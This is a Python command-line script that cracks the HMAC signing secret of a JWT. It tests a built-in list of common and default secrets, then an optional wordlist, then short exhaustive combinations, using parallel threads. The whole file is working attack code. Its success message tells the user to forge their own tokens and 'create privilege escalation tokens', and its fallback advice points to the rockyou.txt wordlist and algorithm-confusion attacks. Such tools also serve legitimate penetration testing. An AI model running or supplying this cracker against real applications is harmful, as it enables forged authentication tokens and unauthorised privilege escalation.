#!/usr/bin/env python3
"""
JWT Secret Bruteforcer
Brute force weak HMAC secrets in JWT tokens
"""

import base64
import json
import hmac
import hashlib
import sys
import time
from itertools import product
from concurrent.futures import ThreadPoolExecutor, as_completed

def url_safe_b64_decode(data):
    """Decode URL-safe base64"""
    missing_padding = len(data) % 4
    if missing_padding:
        data += '=' * (4 - missing_padding)
    data = data.replace('-', '+').replace('_', '/')
    return base64.b64decode(data)

def url_safe_b64_encode(data):
    """Encode to URL-safe base64"""
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

def verify_jwt_signature(token, secret):
    """Verify JWT signature with given secret"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return False
        
        header_payload = f"{parts[0]}.{parts[1]}"
        signature = parts[2]
        
        # Decode header to get algorithm
        header = json.loads(url_safe_b64_decode(parts[0]))
        alg = header.get('alg', 'HS256')
        
        # Only work with HMAC algorithms
        if alg not in ['HS256', 'HS384', 'HS512']:
            return False
        
        # Choose hash function based on algorithm
        hash_func = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512
        }[alg]
        
        # Calculate expected signature
        if isinstance(secret, str):
            secret = secret.encode('utf-8')
        
        expected_signature = hmac.new(
            secret,
            header_payload.encode('utf-8'),
            hash_func
        ).digest()
        
        expected_signature_b64 = url_safe_b64_encode(expected_signature)
        
        return expected_signature_b64 == signature
        
    except Exception:
        return False

def generate_common_secrets():
    """Generate list of common weak secrets"""
    secrets = [
        # Empty and simple
        "", "secret", "key", "password", "123", "test", "admin", "jwt",
        
        # Common passwords
        "password123", "123456", "qwerty", "letmein", "welcome", "monkey",
        "dragon", "princess", "football", "baseball", "abc123", "mustang",
        
        # JWT related
        "jwtsecret", "jwt_secret", "jwt-secret", "your-256-bit-secret",
        "supersecret", "topsecret", "secret123", "secretkey", "mykey",
        "privatekey", "publickey", "hmackey", "signing-key", "token-secret",
        
        # Development/default
        "dev", "development", "prod", "production", "staging", "local",
        "default", "change-me", "changeme", "replace-me", "todo-change",
        "your-secret-here", "insert-secret-here", "my-secret", "app-secret",
        
        # Framework defaults
        "laravel_session", "rails_secret", "django_secret", "flask_secret",
        "express_secret", "node_secret", "spring_secret", "java_secret",
        
        # Weak patterns
        "aaaaaaaaaaaaaaaa", "1234567890abcdef", "abcdefghijklmnop",
        "0123456789abcdef", "abcd1234", "1234abcd",
        
        # Single characters repeated
        "a" * 16, "1" * 16, "0" * 16, "x" * 16,
        "a" * 32, "1" * 32, "0" * 32, "x" * 32,
        
        # Common base64 looking secrets
        "YWRtaW4=", "dGVzdA==", "c2VjcmV0", "cGFzc3dvcmQ=",
        
        # Numbers
        "0", "1", "12", "123", "1234", "12345", "123456", "1234567",
        "12345678", "123456789", "1234567890",
    ]
    
    # Add some variations
    variations = []
    for secret in secrets[:]:
        if secret and len(secret) > 1:
            variations.extend([
                secret.upper(),
                secret.lower(),
                secret.capitalize(),
                f"{secret}!",
                f"{secret}123",
                f"123{secret}",
                f"{secret}_{secret}",
            ])
    
    secrets.extend(variations)
    
    return list(set(secrets))  # Remove duplicates

def generate_bruteforce_secrets(min_len=1, max_len=4, charset='abcdefghijklmnopqrstuvwxyz0123456789'):
    """Generate brute force secrets"""
    secrets = []
    
    for length in range(min_len, max_len + 1):
        print(f"  Generating {length}-character combinations...")
        count = 0
        for combo in product(charset, repeat=length):
            secrets.append(''.join(combo))
            count += 1
            if count > 10000:  # Limit to prevent memory issues
                break
        if count > 10000:
            break
    
    return secrets

def bruteforce_worker(token, secrets_chunk):
    """Worker function for parallel brute forcing"""
    for secret in secrets_chunk:
        if verify_jwt_signature(token, secret):
            return secret
    return None

def bruteforce_jwt_secret(token, wordlist_file=None, brute_force=False, max_threads=4):
    """Brute force JWT secret"""
    print("🔐 Starting JWT secret brute force...")
    
    # Start with common secrets
    print("\n[1] Testing common weak secrets...")
    common_secrets = generate_common_secrets()
    print(f"  Testing {len(common_secrets)} common secrets...")
    
    start_time = time.time()
    
    for i, secret in enumerate(common_secrets):
        if i % 100 == 0:
            print(f"  Progress: {i}/{len(common_secrets)} ({i/len(common_secrets)*100:.1f}%)")
        
        if verify_jwt_signature(token, secret):
            elapsed = time.time() - start_time
            print(f"\n🎯 SECRET FOUND: '{secret}'")
            print(f"⏱️  Time taken: {elapsed:.2f} seconds")
            return secret
    
    print("  ❌ No common secrets found")
    
    # Try wordlist if provided
    if wordlist_file:
        print(f"\n[2] Testing wordlist: {wordlist_file}")
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                wordlist = [line.strip() for line in f if line.strip()]
            
            print(f"  Testing {len(wordlist)} words from wordlist...")
            
            # Split wordlist for parallel processing
            chunk_size = len(wordlist) // max_threads
            chunks = [wordlist[i:i + chunk_size] for i in range(0, len(wordlist), chunk_size)]
            
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures = [executor.submit(bruteforce_worker, token, chunk) for chunk in chunks]
                
                for i, future in enumerate(as_completed(futures)):
                    result = future.result()
                    if result:
                        elapsed = time.time() - start_time
                        print(f"\n🎯 SECRET FOUND: '{result}'")
                        print(f"⏱️  Time taken: {elapsed:.2f} seconds")
                        return result
                    print(f"  Chunk {i+1}/{len(chunks)} completed")
            
            print("  ❌ No secrets found in wordlist")
            
        except FileNotFoundError:
            print(f"  ❌ Wordlist file not found: {wordlist_file}")
        except Exception as e:
            print(f"  ❌ Error reading wordlist: {e}")
    
    # Brute force if requested
    if brute_force:
        print("\n[3] Brute force attack (short secrets only)...")
        print("  ⚠️  This may take a very long time!")
        
        brute_secrets = generate_bruteforce_secrets(1, 3, 'abcdefghijklmnopqrstuvwxyz0123456789')
        print(f"  Testing {len(brute_secrets)} brute force combinations...")
        
        # Split for parallel processing
        chunk_size = len(brute_secrets) // max_threads
        chunks = [brute_secrets[i:i + chunk_size] for i in range(0, len(brute_secrets), chunk_size)]
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(bruteforce_worker, token, chunk) for chunk in chunks]
            
            for i, future in enumerate(as_completed(futures)):
                result = future.result()
                if result:
                    elapsed = time.time() - start_time
                    print(f"\n🎯 SECRET FOUND: '{result}'")
                    print(f"⏱️  Time taken: {elapsed:.2f} seconds")
                    return result
                print(f"  Chunk {i+1}/{len(chunks)} completed")
        
        print("  ❌ No secrets found in brute force")
    
    elapsed = time.time() - start_time
    print(f"\n❌ Secret not found")
    print(f"⏱️  Total time: {elapsed:.2f} seconds")
    
    return None

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 jwt_secret_bruteforce.py <JWT_TOKEN> [options]")
        print("")
        print("Options:")
        print("  -w, --wordlist <file>    Use custom wordlist file")
        print("  -b, --brute-force       Enable brute force attack (slow!)")
        print("  -t, --threads <num>     Number of threads (default: 4)")
        print("")
        print("Examples:")
        print("  python3 jwt_secret_bruteforce.py 'eyJ...'")
        print("  python3 jwt_secret_bruteforce.py 'eyJ...' -w passwords.txt")
        print("  python3 jwt_secret_bruteforce.py 'eyJ...' -b -t 8")
        return
    
    token = sys.argv[1].strip()
    wordlist_file = None
    brute_force = False
    max_threads = 4
    
    # Parse arguments
    i = 2
    while i < len(sys.argv):
        arg = sys.argv[i]
        if arg in ['-w', '--wordlist'] and i + 1 < len(sys.argv):
            wordlist_file = sys.argv[i + 1]
            i += 2
        elif arg in ['-b', '--brute-force']:
            brute_force = True
            i += 1
        elif arg in ['-t', '--threads'] and i + 1 < len(sys.argv):
            max_threads = int(sys.argv[i + 1])
            i += 2
        else:
            i += 1
    
    # Validate token format
    parts = token.split('.')
    if len(parts) != 3:
        print("❌ Invalid JWT format")
        return
    
    try:
        header = json.loads(url_safe_b64_decode(parts[0]))
        alg = header.get('alg', 'unknown')
        
        if alg not in ['HS256', 'HS384', 'HS512']:
            print(f"❌ Algorithm '{alg}' is not HMAC-based")
            print("   This tool only works with HS256, HS384, HS512")
            return
        
        print(f"🎯 Target: JWT with {alg} algorithm")
        print(f"🧵 Threads: {max_threads}")
        if wordlist_file:
            print(f"📖 Wordlist: {wordlist_file}")
        if brute_force:
            print("💪 Brute force: Enabled (warning: slow!)")
        
        # Start brute force
        secret = bruteforce_jwt_secret(token, wordlist_file, brute_force, max_threads)
        
        if secret is not None:
            print("\n=== SUCCESS! ===")
            print(f"Secret: {secret}")
            print(f"Length: {len(secret)} characters")
            print("\nYou can now use this secret to:")
            print("1. Sign your own JWT tokens")
            print("2. Verify other JWT tokens from the same application")
            print("3. Create privilege escalation tokens")
        else:
            print("\n=== RECOMMENDATIONS ===")
            print("1. Try a larger wordlist (rockyou.txt, etc.)")
            print("2. Enable brute force for very short secrets")
            print("3. Look for other JWT vulnerabilities (algorithm confusion)")
            print("4. Check if the secret might be in application source code")
    
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()

